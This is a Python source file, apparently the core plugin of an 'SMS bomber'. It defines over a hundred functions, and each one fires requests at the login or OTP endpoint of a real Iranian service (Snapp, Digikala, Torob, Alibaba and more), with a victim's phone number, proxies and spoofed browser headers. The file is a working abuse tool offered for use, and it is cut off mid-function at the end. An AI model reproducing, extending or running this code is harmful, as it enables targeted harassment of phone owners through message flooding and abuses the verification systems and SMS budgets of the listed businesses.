from Plugins.my_handler import *
from requests import post, get
from user_agent import generate_user_agent



handler = Handler()

@handler.sms_api
def snapp(num, proxies):
        post(proxies=proxies, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
            json={"cellphone": "+98"+num}, headers={"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"},)

@handler.sms_api
def tapsi(num, proxies):
    post(proxies=proxies, url="https://tap33.me/api/v2/user", 
                json={"credential":{"phoneNumber":f'0{num}',"role":"PASSENGER"}},)


@handler.sms_api
def torob(num, proxies):
    get(proxies=proxies, url=f'https://api.torob.com/a/phone/send-pin/?phone_number=0{num}',
                headers={"Host": "api.torob.com","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","accept": "*/*","origin": "https://torob.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://torob.com/user/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","cookie": "amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com\u003deyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9"},)

@handler.sms_api
def alibaba(num, proxies):
    post(proxies=proxies, url="https://ws.alibaba.ir/api/v3/account/mobile/otp",
                json={"phoneNumber":f'0{num}'},
                )
    

@handler.sms_api
def snapmarket(num, proxies):
    post(proxies=proxies, url="https://account.api.balad.ir/api/web/auth/login/",
                json={
                    "phone_number": f'0{num}',
                    "os_type": "W"
                },
    )


@handler.sms_api
def miareh(num, proxies): get(proxies=proxies, url=f'https://www.miare.ir/p/restaurant/#/login?phone=0{num}',)


@handler.sms_api
def ostadkar(num, proxies): post(proxies=proxies, url="https://api.ostadkr.com/login",json={"mobile": f'0{num}'},)


@handler.sms_api
def drnext(num, proxies):
            post(proxies=proxies, url="https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", 
                json={
                    "source": "besina",
                    "mobile": f'0{num}'
                }, )


@handler.sms_api
def behtarino(num, proxies):        
    post(proxies=proxies, url="https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", 
                json={"phone": f'0{num}'},
            )

@handler.sms_api
def behtarino(num, proxies):
            post(proxies=proxies, url="https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", 
                json={"phone": f'0{num}'})

@handler.sms_api
def bit24(num, proxies):
    post(proxies=proxies, url='https://bit24.cash/auth/bit24/api/v3/auth/check-mobile',
                json={"mobile": f'0{num}',
                    "contry_code": "98"})             

@handler.sms_api
def drdr(num, proxies):
        post(proxies=proxies, url="https://drdr.ir/api/v3/auth/login/mobile/init",
                    json={"mobile": num})

@handler.sms_api
def drto(num, proxies):
    get("https://api.doctoreto.com/api/web/patient/v1/accounts/register",
                    json={
                        "mobile": num,
                        "captcha": "",
                        "country_id": 205
                    })

@handler.sms_api
def okala(num, proxies):
    post(proxies=proxies, url="https://api-react.okala.com/C/CustomerAccount/OTPRegister",
                    json={"mobile": f'0{num}',
                            "deviceTypeCode": 0, "confirmTerms": True, "notRobot": False},)    


@handler.sms_api
def banimod(num, proxies):
    post(proxies=proxies, url="https://mobapi.banimode.com/api/v2/auth/request",
                    json={"phone": f'0{num}' })

@handler.sms_api
def beroozmarket(num, proxies):
    post(proxies=proxies, url="https://api.beroozmart.com/api/pub/account/send-otp",
                    json={"mobile": f'0{num}', "sendViaSms": True, "email": "null", "sendViaEmail": False},)

@handler.sms_api
def itoll(num, proxies):
    post(proxies=proxies, url="https://app.itoll.com/api/v1/auth/login",
                    json={"mobile": f'0{num}'})

@handler.sms_api
def gap(num, proxies):
    get(proxies=proxies, url=f'https://core.gap.im/v1/user/add.json?mobile=%2B98{num}')

@handler.sms_api
def pinket(num, proxies):
    post(proxies=proxies, url="https://pinket.com/api/cu/v2/phone-verification",
                    json={"phoneNumber": f'0{num}'})
    

@handler.sms_api
def football360(num, proxies):
    post(proxies=proxies, url="https://football360.ir/api/auth/verify-phone/",
                    json={"phone_number": "+98"+num})

@handler.sms_api
def pinorest(num, proxies):
    post(proxies=proxies, url="https://api.pinorest.com/frontend/auth/login/mobile",
                    json={"mobile": f'{num}'})


@handler.sms_api
def mrbilit(num, proxies): get(proxies=proxies, url=f'https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=0{num}&source=2&sendTokenIfNot=true')

@handler.sms_api
def hamrahmechanich(num, proxies):
    post(proxies=proxies, url="https://www.hamrah-mechanic.com/api/v1/membership/otp",
            json={"PhoneNumber":f'0{num}',"prevDomainUrl":"https://www.google.com/","landingPageUrl":"https://www.hamrah-mechanic.com/cars-for-sale/","orderPageUrl":"https://www.hamrah-mechanic.com/membersignin/","prevUrl":"https://www.hamrah-mechanic.com/cars-for-sale/","referrer":"https://www.google.com/"},)


@handler.sms_api
def lendo(num, proxies):
    post(proxies=proxies, url="https://api.lendo.ir/api/customer/auth/send-otp",
                    json={ "mobile": f'0{num}'},
            )

@handler.sms_api
def taghche(num, proxies):
    post(proxies=proxies, url="https://gw.taaghche.com/v4/site/auth/login",
                    json={"contact": f'0{num}', "forceOtp": False},
    )

@handler.sms_api
def fidibo(num, proxies):
    post("https://fidibo.com/user/login-by-sms", 
                    f'mobile_number={num}&country_code=ir&K1YwQTI0V2xtb3lZNGw0TDhDZm1SUT09=c0tjS0ViOTE2b5F1eE9MRjdLWEhodz09',
            )
    
@handler.sms_api
def khodro45(num, proxies):
    post(proxies=proxies, url="https://khodro45.com/api/v1/customers/otp/", 
                    json={"mobile": f'0{num}'},
                )

@handler.sms_api
def pateh(num, proxies):
    post(proxies=proxies, url="https://api.pateh.com/api/v1/LoginOrRegister",
                        json={"mobile": f'0{num}'}
                        ,
                        headers={
    "authority": "api.pateh.com",
    "method": "POST",
    "path": "/api/v1/LoginOrRegister",
    "scheme": "https",
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
    "Content-Length": "24",
    "Content-Type": "application/json;charset=UTF-8",
    "Origin": "https://www.pateh.com",
    "Referer": "https://www.pateh.com/",
    "Sec-Ch-Ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "Windows",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": generate_user_agent(os="win")
            })    

@handler.sms_api
def ketabchi(num, proxies):
    post(proxies=proxies, url="https://ketabchi.com/api/v1/auth/requestVerificationCode",
                    json={"auth": {"phoneNumber": f'0{num}'}},
                    )

@handler.sms_api
def reyanertebet(num, proxies):
    post(proxies=proxies, url="https://pay.rayanertebat.ir/api/User/Otp?t=1692088339811",
                    json={"mobileNo": f'0{num}'},
                    )

@handler.sms_api
def bimito(num, proxies):
    post(proxies=proxies, url="https://bimito.com/api/vehicleorder/v2/app/auth/login-with-verify-code",
                    json={"phoneNumber": f'0{num}', "isResend": False},
                    )

@handler.sms_api
def pindo(num, proxies):
    post(proxies=proxies, url="https://api.pindo.ir/v1/user/login-register/",
                    json={"phone": f'0{num}'},
                    )

@handler.sms_api
def delino(num, proxies):
    post(proxies=proxies, url="https://www.delino.com/user/register",
                    json={ "mobile": f'0{num}'},
                    )

@handler.sms_api
def zoodex(num, proxies):
    post(proxies=proxies, url="https://admin.zoodex.ir/api/v1/login/check",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def kukala(num, proxies):
    post(proxies=proxies, url="https://api.kukala.ir/api/user/Otp", 
                    json={"phoneNumber": f'0{num}'},
                    )

@handler.sms_api
def baskol(num, proxies):
    post(proxies=proxies, url="https://www.buskool.com/send_verification_code",
                    json={"phone": f'0{num}'},
                    )

@handler.sms_api
def threetex(num, proxies):
    post(proxies=proxies, url="https://3tex.io/api/1/users/validation/mobile",
                    json={"receptorPhone": f'0{num}'},
                    )

@handler.sms_api
def deniizshop(num, proxies):
    post(proxies=proxies, url="https://deniizshop.com/api/v1/sessions/login_request",
                    json={"mobile_number": f'0{num}'},
                    )

@handler.sms_api
def flightio(num, proxies):
    post(proxies=proxies, url="https://flightio.com/bff/Authentication/CheckUserKey",
                    json={"userKey": f'0{num}'},
                    )

@handler.sms_api
def abantether(num, proxies):
    post(proxies=proxies, url="https://abantether.com/users/register/phone/send/",
                    json={"phoneNumber": f'0{num}'},
                    )

@handler.sms_api
def pooleno(num, proxies):
    post(proxies=proxies, url="https://api.pooleno.ir/v1/auth/check-mobile",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def wideapp(num, proxies):
    post(proxies=proxies, url="https://agent.wide-app.ir/auth/token",
                    json={"grant_type": "otp", "client_id": "62b30c4af53e3b0cf100a4a0", "phone": f'0{num}'},
            )

@handler.sms_api
def iranlms(num, proxies):
    post(proxies=proxies, url="https://messengerg2c4.iranlms.ir/",
                    json={"se": f'0{num}'},
                    )

@handler.sms_api
def classino(num, proxies):
    post(proxies=proxies, url="https://nx.classino.com/otp/v1/api/login",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def snappfood(num, proxies):
    post(proxies=proxies, url="https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&sms_apialClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa",
                    json={"cellphone": f'0{num}'},
                    )

@handler.sms_api
def bitbarg(num, proxies):
    post(proxies=proxies, url="https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
                    json={"phone": f'0{num}'},
                    )

@handler.sms_api
def bahramshop(num, proxies):
    post(proxies=proxies, url="https://api.bahramshop.ir/api/user/validate/username",
                    json={"username": f'0{num}'},
                    )

@handler.sms_api
def tak(num, proxies):
    post(proxies=proxies, url="https://takshopaccessorise.ir/api/v1/sessions/login_request",
                    json={"mobile_phone": f'0{num}'},
                    )

@handler.sms_api
def chamedon(num, proxies):
    post(proxies=proxies, url="https://chamedoon.com/api/v1/membership/guest/request_mobile_verification",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def kilid(num, proxies):
    post(proxies=proxies, url="https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def otaghak(num, proxies):
    post(proxies=proxies, url="https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
                    json={"userName": f'0{num}'},
                    )

@handler.sms_api
def shab(num, proxies):
    post(proxies=proxies, url="https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile",
                    json={"mobile": f'0{num}'},
                    )
    
@handler.sms_api
def raybit(num, proxies):
    post(proxies=proxies, url="https://api.raybit.net:3111/api/v1/authentication/register/mobile",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def farvi(num, proxies):
    post(proxies=proxies, url="https://farvi.shop/api/v1/sessions/login_request",
                    json={"mobile_phone": f'0{num}'},
                    )    

@handler.sms_api
def namava(num, proxies):
    post(proxies=proxies, url="https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
                    json={"UserName": f'0{num}'},
                    )

@handler.sms_api
def a4baz(num, proxies):
    post(proxies=proxies, url="https://a4baz.com/api/web/login",
                    json={"cellphone": f'0{num}'},
                    )

@handler.sms_api
def anargift(num, proxies):
    post(proxies=proxies, url="https://api.anargift.com/api/people/auth",
                    json={"user": f'0{num}'},
                    )


@handler.sms_api
def nobat(num, proxies):
    post(proxies=proxies, url="https://nobat.ir/api/public/patient/login/phone",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def ayantech(num, proxies):
    post(proxies=proxies, url="https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
                    json={"Parametrs": {"ApplicationType": "Web","ApplicationUniqueToken": None, "ApplicationVersion": "1.0.0","MobileNumber": f'0{num}' }},
                    )

@handler.sms_api
def simkhan(num, proxies):
    post(proxies=proxies, url="https://www.simkhanapi.ir/api/users/registerV2",
                    json={"mobileNumber": f'0{num}'},
                    )

@handler.sms_api
def sibirani(num, proxies):
    post(proxies=proxies, url="https://sandbox.sibirani.ir/api/v1/user/invite",
                    json={"username": f'0{num}'},
                    )

@handler.sms_api
def hyperjan(num, proxies):
    post(proxies=proxies, url="https://shop.hyperjan.ir/api/users/manage",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def digikala(num, proxies):
    post(proxies=proxies, url="https://api.digikala.com/v1/user/authenticate/",
            json={"username": f'0{num}'},
                    )

@handler.sms_api
def hiword(num, proxies):
    post(proxies=proxies, url="https://hiword.ir/wp-json/otp-login/v1/login",
                    json={"identifier": f'0{num}'},
                    )

@handler.sms_api
def tikban(num, proxies):
    post(proxies=proxies, url="https://tikban.com/Account/LoginAndRegister",
                    json={"cellPhone": f'0{num}'},
                    )


@handler.sms_api
def dicardo(num, proxies):
    post(proxies=proxies, url="https://dicardo.com/main/sendsms",
                    json={"phone": f'0{num}'},
                    )

@handler.sms_api
def digistyle(num, proxies):
    post(proxies=proxies, url="https://www.digistyle.com/users/login-register/",
                    json={"loginRegister[email_phone]": f'0{num}'},
                    )

@handler.sms_api
def banankala(num, proxies):
    post(proxies=proxies, url="https://banankala.com/home/login",
                    json={"Mobile": f'0{num}'},
                    )

@handler.sms_api
def offdecor(num, proxies):
    post(proxies=proxies, url="https://www.offdecor.com/index.php?route=account/login/sendCode",
                    json={"phone": f'0{num}'},
                    )

@handler.sms_api
def exo(num, proxies):
    post(proxies=proxies, url="https://exo.ir/index.php?route=account/mobile_login",
                    json={"mobile_number": f'0{num}'},
                    )

@handler.sms_api
def shahrefarsh(num, proxies):
    post(proxies=proxies, url="https://shahrfarsh.com/Account/Login",
                    json={"phoneNumber": f'0{num}'},
                    )

@handler.sms_api
def beheshticarpet(num, proxies):
    post(proxies=proxies, url="https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php",
                    json={"phone_email": f'0{num}'},
                    )

@handler.sms_api
def khanomi(num, proxies):
    post(proxies=proxies, url="https://www.khanoumi.com/accounts/sendotp",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def rojashop(num, proxies):
    post(proxies=proxies, url="https://rojashop.com/api/auth/sendOtp",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def dadpardaz(num, proxies):
    post(proxies=proxies, url="https://dadpardaz.com/advice/getLoginConfirmationCode",
                    json={"mobile": f'0{num}'},
                    )


@handler.sms_api
def rokla(num, proxies):
    post(proxies=proxies, url="https://api.rokla.ir/api/request/otp",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def khodro45(num, proxies):
    post(proxies=proxies, url="https://khodro45.com/api/v1/customers/otp/",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def pezeshket(num, proxies):
    post(proxies=proxies, url="https://api.pezeshket.com/core/v1/auth/requestCode",
                    json={"mobileNumber": f'0{num}'},
                    )

@handler.sms_api
def virgool(num, proxies):
    post(proxies=proxies, url="https://virgool.io/api/v1.4/auth/verify",
                    json={"method": "phone", "identifier": f'0{num}'},
                    )

@handler.sms_api
def timcheh(num, proxies):
    post(proxies=proxies, url="https://api.timcheh.com/auth/otp/send",
                    json={"mobile": f'0{num}'},
                    )


@handler.sms_api
def paklean(num, proxies):
    post(proxies=proxies, url="https://client.api.paklean.com/user/resendCode",
                    json={"username": f'0{num}'},
                    )

@handler.sms_api
def daal(num, proxies):
    post(proxies=proxies, url="https://daal.co/api/authentication/login-register/method/phone-otp/user-role/customer/verify-request"
        ,headers={ "Accept": "application/json",
                },
                json={ "phone": f"0{num}"})

@handler.sms_api
def bimebazar(num, proxies):
    post(proxies=proxies, url="https://bimebazar.com/accounts/api/login_sec/",
                json={ "username": f"0{num}"},
                )

@handler.sms_api
def azki(num, proxies):
    post(proxies=proxies, url="https://www.azki.co/api/vehicleorder/v2/app/auth/check-login-availability/",
                json={"phoneNumber": f"0{num}"},
                )

@handler.sms_api
def safarmarket(num, proxies):
    post(proxies=proxies, url="https://safarmarket.com//api/security/v2/user/otp",
                json={"phone": 
